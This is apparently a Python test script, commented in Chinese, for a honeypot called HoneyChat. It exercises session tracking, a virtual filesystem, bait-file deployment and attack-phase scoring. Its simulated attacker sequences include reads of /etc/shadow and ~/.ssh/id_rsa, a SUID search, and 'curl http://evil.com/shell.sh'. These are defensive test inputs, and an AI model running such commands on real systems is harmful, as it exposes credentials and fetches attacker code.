#!/usr/bin/env python3
"""
HoneyChat 扩展功能测试脚本

测试会话管理、虚拟文件系统、攻击剧本等新功能
"""

import sys
sys.path.insert(0, '../services/honeypot')

from session_manager import session_manager
from virtual_fs import VirtualFileSystem, FSCommandHandler
from scenario_engine import ScenarioEngine
from attack_analyzer import AttackAnalyzer


def test_session_manager():
    """测试会话管理器"""
    print("=" * 50)
    print("测试1: 会话管理器")
    print("=" * 50)

    # 创建会话
    session = session_manager.get_or_create("test-session-1")
    print(f"✓ 创建会话: {session.session_id}")
    print(f"  当前目录: {session.cwd}")
    print(f"  用户: {session.env['USER']}")

    # 添加命令
    session.add_command("whoami")
    session.add_command("ls -la")
    print(f"✓ 添加命令历史: {len(session.history)} 条")

    # 修改状态
    session.cwd = "/tmp"
    print(f"✓ 修改目录: {session.cwd}")

    # 获取上下文
    context = session.get_context()
    print(f"✓ 会话上下文: {context}")
    print()


def test_virtual_fs():
    """测试虚拟文件系统"""
    print("=" * 50)
    print("测试2: 虚拟文件系统")
    print("=" * 50)

    vfs = VirtualFileSystem()
    handler = FSCommandHandler(vfs)

    # 测试 pwd
    resp, new_cwd = handler.handle("pwd", "/home/user")
    print(f"✓ pwd: {resp.strip()}")

    # 测试 ls
    resp, _ = handler.handle("ls", "/home/user")
    print(f"✓ ls /home/user: {resp.strip()}")

    # 测试 cd
    resp, new_cwd = handler.handle("cd /tmp", "/home/user")
    print(f"✓ cd /tmp: 新目录={new_cwd}")

    # 测试 cat
    resp, _ = handler.handle("cat /etc/passwd", "/home/user")
    print(f"✓ cat /etc/passwd: {len(resp)} 字节")

    # 测试 mkdir
    resp, _ = handler.handle("mkdir /tmp/test", "/tmp")
    print(f"✓ mkdir /tmp/test: 成功")

    # 测试 touch
    resp, _ = handler.handle("touch /tmp/test.txt", "/tmp")
    print(f"✓ touch /tmp/test.txt: 成功")

    # 验证文件存在
    resp, _ = handler.handle("ls /tmp", "/tmp")
    print(f"✓ ls /tmp: {resp.strip()}")
    print()


def test_scenario_engine():
    """测试攻击剧本引擎"""
    print("=" * 50)
    print("测试3: 攻击剧本引擎")
    print("=" * 50)

    vfs = VirtualFileSystem()
    engine = ScenarioEngine()

    # 测试场景触发
    commands = [
        "find . -name config.php",
        "ls ~/.ssh",
        "cat /etc/shadow",
        "find / -name *.sql",
    ]

    for cmd in commands:
        engine.check_and_deploy("test-session-2", cmd, vfs)
        print(f"✓ 执行命令: {cmd}")

    # 检查诱饵文件
    print(f"\n已部署诱饵:")
    for path in engine.deployed_baits.get("test-session-2", []):
        print(f"  - {path}")

    # 验证诱饵可访问
    if vfs.exists("/home/user/config.php"):
        content = vfs.cat("/home/user/config.php")
        print(f"\n✓ 诱饵内容预览:")
        print(f"  {content[:50]}...")
    print()


def test_attack_analyzer():
    """测试攻击链分析器"""
    print("=" * 50)
    print("测试4: 攻击链分析器")
    print("=" * 50)

    analyzer = AttackAnalyzer()

    # 模拟攻击命令序列
    attack_commands = [
        "whoami",
        "uname -a",
        "id",
        "sudo -l",
        "find / -perm -4000",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "curl http://evil.com/shell.sh",
    ]

    print("攻击命令序列:")
    for i, cmd in enumerate(attack_commands, 1):
        phase = analyzer.analyze_command(cmd)
        print(f"  {i}. {cmd:30s} -> {phase}")

    # 分析整个会话
    analysis = analyzer.analyze_session(attack_commands)
    print(f"\n会话分析:")
    print(f"  总命令数: {analysis['total_commands']}")
    print(f"  主要阶段: {analysis['dominant_phase']}")
    print(f"  攻击摘要: {analysis['summary']}")

    # 计算风险评分
    risk_score = analyzer.get_risk_score(attack_commands)
    print(f"  风险评分: {risk_score}/100")

    print(f"\n各阶段统计:")
    for phase, count in analysis['phases'].items():
        print(f"  - {phase}: {count} 次")
    print()


def test_integration():
    """测试集成场景"""
    print("=" * 50)
    print("测试5: 集成场景")
    print("=" * 50)

    # 模拟完整的攻击会话
    session = session_manager.get_or_create("integration-test")
    vfs = VirtualFileSystem()
    handler = FSCommandHandler(vfs)
    engine = ScenarioEngine()
    analyzer = AttackAnalyzer()

    attack_sequence = [
        "pwd",
        "whoami",
        "ls -la",
        "cd /tmp",
        "pwd",
        "find . -name config",
        "cat /home/user/config.php",
        "ls ~/.ssh",
        "cat ~/.ssh/id_rsa",
    ]

    print("模拟攻击会话:")
    for cmd in attack_sequence:
        # 添加到历史
        session.add_command(cmd)

        # 尝试文件系统处理
        resp, new_cwd = handler.handle(cmd, session.cwd)
        if new_cwd:
            session.cwd = new_cwd

        # 检查场景触发
        engine.check_and_deploy(session.session_id, cmd, vfs)

        # 分析攻击阶段
        phase = analyzer.analyze_command(cmd)

        print(f"  [{phase:20s}] {cmd}")

    # 最终分析
    print(f"\n会话状态:")
    print(f"  当前目录: {session.cwd}")
    print(f"  命令历史: {len(session.history)} 条")

    risk = analyzer.get_risk_score(session.history)
    print(f"  风险评分: {risk}/100")

    baits = engine.deployed_baits.get(session.session_id, set())
    print(f"  已部署诱饵: {len(baits)} 个")
    print()


if __name__ == "__main__":
    print("\n🚀 HoneyChat 扩展功能测试\n")

    try:
        test_session_manager()
        test_virtual_fs()
        test_scenario_engine()
        test_attack_analyzer()
        test_integration()

        print("=" * 50)
        print("✅ 所有测试通过!")
        print("=" * 50)

    except Exception as e:
        print(f"\n❌ 测试失败: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
